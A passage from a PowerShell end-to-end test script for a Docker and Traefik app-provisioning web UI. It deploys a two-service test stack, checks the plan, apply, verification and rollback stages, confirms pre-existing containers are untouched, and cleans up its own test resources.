      $before = @((Invoke-Docker ps -a --format '{{.ID}} {{.Names}}').Output | Where-Object { $_ } | ForEach-Object { $p = $_ -split ' '; [pscustomobject]@{ Id = $p[0]; Name = $p[1]; Started = ((Invoke-Docker inspect -f '{{.State.StartedAt}}' $p[0]).Output -join '') } })
      $netName = "tpm-prov-$id-proxy"
      $null = Invoke-Docker network create $netName
      $stackText = @"
services:
  web:
    image: $img
    command: ["--api.insecure=true", "--ping=true"]
    ports: ["18999:8080"]
    depends_on:
      helper: { condition: service_healthy }
  helper:
    image: $img
    command: ["--ping=true"]
    healthcheck: { test: ["CMD", "traefik", "healthcheck", "--ping"], interval: 3s, retries: 10 }
    volumes: [helperdata:/data]
volumes: { helperdata: {} }
"@
      $pc = ConvertFrom-ComposeModel -Model (ConvertFrom-ComposeText -Text $stackText) -Origin 'test stack'
      $pn = New-NormalizedManifest -Conversion $pc -Facts @{ Name = "Prov Test $id"; SourceUrl = 'https://github.com/example/prov-test'; SourceKind = 'github'; SourceKindLabel = 'GitHub'; License = 'MIT'; Documents = @(); Evidence = @(); Notes = @() }
      $e2e = [ordered]@{ version = 1; draftId = 'eeee5555ffff6666'; createdAt = (Get-Date -Format 's'); url = 'https://github.com/example/prov-test'; kind = 'github-repo'; catalogMatch = $null; manifest = $pn; ai = @() }
      [IO.File]::WriteAllText((Join-Path $dd 'eeee5555ffff6666.json'), ($e2e | ConvertTo-Json -Depth 30))
      $ev = Invoke-WebUi $ui GET '/api/provision/draft?id=eeee5555ffff6666'
      $acks = @($ev.Data.findings | ForEach-Object { $_.id })
      $project = "prov-$id"
      $dup = Invoke-WebUi $ui POST '/api/provision/plan' @{ draftId = 'eeee5555ffff6666'; project = $project; access = 'lan'; hostname = "prov-$id.home.example"; auth = 'none'; acknowledge = @($acks + 'auth:none') }
      Test-Condition 'e2e plan: an image that already runs on this PC (here: Traefik) is never installed again silently' (-not $dup.Data.canApply -and @($dup.Data.blockers | Where-Object { $_ -match 'already runs on this PC' }).Count) $dup.Body
      $pe = Invoke-WebUi $ui POST '/api/provision/plan' @{ draftId = 'eeee5555ffff6666'; project = $project; access = 'lan'; hostname = "prov-$id.home.example"; auth = 'none'; acknowledge = @($acks + 'auth:none'); anotherInstance = $true; instanceLabel = 'Test' }
      Test-Condition 'e2e plan: a two-service imported app on a LAN route can be deployed after review' ($pe.Status -eq 200 -and $pe.Data.canApply -and $pe.Data.routing -and @($pe.Data.routing.traefik.changes | Where-Object { $_.file -match "svc-$project\.yml" }).Count) "$($pe.Status) blockers=$(@($pe.Data.blockers) -join ' | ')"
      if ($pe.Data.canApply) {
        $ap = Invoke-WebUi $ui POST '/api/provision/apply' @{ planId = $pe.Data.planId; confirm = $true }
        $stages = @($ap.Data.journal.stages | ForEach-Object { "$($_.stage)=$($_.status)" })
        Test-Condition 'e2e apply: install, backend and route stages pass in order; the journal records what was created' ($ap.Status -eq 200 -and $ap.Data.ok -and ($stages -join ',') -eq 'install=passed,backend=passed,route=passed' -and @($ap.Data.journal.resources | Where-Object { $_.kind -eq 'compose-project' -and $_.ownership -eq 'created' }).Count -and @($ap.Data.journal.resources | Where-Object { $_.kind -eq 'traefik-route' }).Count) "$($ap.Status) $($stages -join ',') $($ap.Body.Substring(0, [Math]::Min(400, $ap.Body.Length)))"
        $ver = @($ap.Data.journal.verification)
        $vs = { param($n) [string](@($ver | Where-Object { $_.stage -eq $n })[0].status) }
        Test-Condition 'e2e verify: compose, images, containers, dependencies (health check), backend and Docker DNS pass; untested stages are not reported as passed' ((& $vs 'compose') -eq 'passed' -and (& $vs 'images') -eq 'passed' -and (& $vs 'containers') -eq 'passed' -and (& $vs 'dependencies') -eq 'passed' -and (& $vs 'backend') -eq 'passed' -and (& $vs 'docker-dns') -eq 'passed' -and (& $vs 'router') -ne 'passed' -and (& $vs 'cloudflare') -eq 'not-applicable') (($ver | ForEach-Object { "$($_.stage)=$($_.status)" }) -join ', ')
        $folder = [string](@($ap.Data.journal.resources | Where-Object { $_.kind -eq 'compose-project' })[0].detail)
        $routeFile = Join-Path $install "traefik\dynamic\svc-$project.yml"
        $routeText = $(if (Test-Path -LiteralPath $routeFile) { Get-Content -Raw -LiteralPath $routeFile } else { '' })
        $hasManifest = Test-Path -LiteralPath (Join-Path $folder '.dtc-manifest.json')
        Test-Condition 'e2e files: the imported manifest is kept next to compose.yaml; the route is an explicit file-provider file pointing at the web container by name' ($hasManifest -and $routeText -match "${project}-web:8080") "manifest=$hasManifest in $folder ($(@(Get-ChildItem -LiteralPath $folder -Force -ErrorAction SilentlyContinue | ForEach-Object { $_.Name }) -join ', ')) result=$($ap.Body.Substring(0, [Math]::Min(300, $ap.Body.Length)))"
        $apps = Invoke-WebUi $ui GET '/api/apps'
        $mine = @($apps.Data.apps | Where-Object { $_.project -eq $project })
        Test-Condition 'e2e lifecycle: the Installed apps page shows the imported app with its roles from the imported manifest' ($apps.Status -eq 200 -and $mine.Count -eq 1) (($apps.Data.apps | ForEach-Object { $_.project }) -join ',')
        $rbPrev = Invoke-WebUi $ui POST '/api/provision/rollback/plan' @{ operationId = $ap.Data.operationId }
        Test-Condition 'e2e rollback preview: removes the route and the project, keeps data unless asked' ($rbPrev.Status -eq 200 -and @($rbPrev.Data.plan.steps | Where-Object { $_.kind -eq 'traefik-route' }).Count -and @($rbPrev.Data.plan.kept | Where-Object { $_.kind -eq 'data-volume' }).Count) $rbPrev.Body
        $rbBad = Invoke-WebUi $ui POST '/api/provision/rollback' @{ operationId = $ap.Data.operationId; confirm = $true; deleteData = $true; confirmText = 'wrong' }
        $rbOk = Invoke-WebUi $ui POST '/api/provision/rollback' @{ operationId = $ap.Data.operationId; confirm = $true; deleteData = $true; confirmText = $project }
        $left = @((Invoke-Docker ps -a --filter "label=org.traefik-proxy.project=$project" -q).Output | Where-Object { $_ })
        $vols = @((Invoke-Docker volume ls -q --filter "name=${project}_").Output | Where-Object { $_ })
        Test-Condition 'e2e rollback: deleting data needs the project name; then route, containers, volumes and files are gone' ($rbBad.Status -eq 400 -and $rbOk.Status -eq 200 -and $rbOk.Data.ok -and -not $left.Count -and -not $vols.Count -and -not (Test-Path -LiteralPath (Join-Path $install "traefik\dynamic\svc-$project.yml")) -and -not (Test-Path -LiteralPath $folder)) "$($rbBad.Status) $($rbOk.Body) left=$($left.Count) vols=$($vols.Count) folder=$(Test-Path -LiteralPath $folder)"
        $rbTwice = Invoke-WebUi $ui POST '/api/provision/rollback' @{ operationId = $ap.Data.operationId; confirm = $true }
        Test-Condition 'e2e rollback: an operation is rolled back only once' ($rbTwice.Status -eq 409) $rbTwice.Body
      }
      $after = @((Invoke-Docker ps -a --format '{{.ID}} {{.Names}}').Output | Where-Object { $_ } | ForEach-Object { $p = $_ -split ' '; [pscustomobject]@{ Id = $p[0]; Name = $p[1]; Started = ((Invoke-Docker inspect -f '{{.State.StartedAt}}' $p[0]).Output -join '') } })
      $changed = @($before | Where-Object { $b = $_; -not @($after | Where-Object { $_.Id -eq $b.Id -and $_.Started -eq $b.Started }).Count })
      Test-Condition 'safety: every container that existed before keeps its ID and start time (production untouched)' (-not $changed.Count) (($changed | ForEach-Object { $_.Name }) -join ', ')
    }
  }
} finally {
  if ($ui) { Stop-TestServer $ui }
  if ($mock) { New-Item -ItemType File -Force -Path $mock.StopFile | Out-Null; Start-Sleep -Milliseconds 300; Stop-Process -Id $mock.Process.Id -Force -ErrorAction SilentlyContinue }
  if ($dockerOk) {
    foreach ($c2 in @((Invoke-Docker ps -a --filter "label=org.traefik-proxy.project=prov-$id" -q).Output | Where-Object { $_ })) { $null = Invoke-Docker rm -f $c2 }
    foreach ($v2 in @((Invoke-Docker volume ls -q --filter "name=prov-${id}_").Output | Where-Object { $_ })) { $null = Invoke-Docker volume rm $v2 }
    if ($netName) { $null = Invoke-Docker network rm $netName }
  }
  Remove-Item -LiteralPath $work -Recurse -Force -ErrorAction SilentlyContinue
  $sib = Join-Path ([IO.Path]::GetTempPath()) "prov-$id"; if (Test-Path -LiteralPath $sib) { Remove-Item -LiteralPath $sib -Recurse -Force -ErrorAction SilentlyContinue }
}

$failed = @($script:Results | Where-Object { $_.Status -eq 'FAIL' })
Write-Host ''
Write-Host ('{0} passed, {1} failed, {2} skipped' -f @($script:Results | Where-Object { $_.Status -eq 'PASS' }).Count, $failed.Count, @($script:Results | Where-Object { $_.Status -eq 'SKIP' }).Count)
if ($failed.Count) { exit 1 }
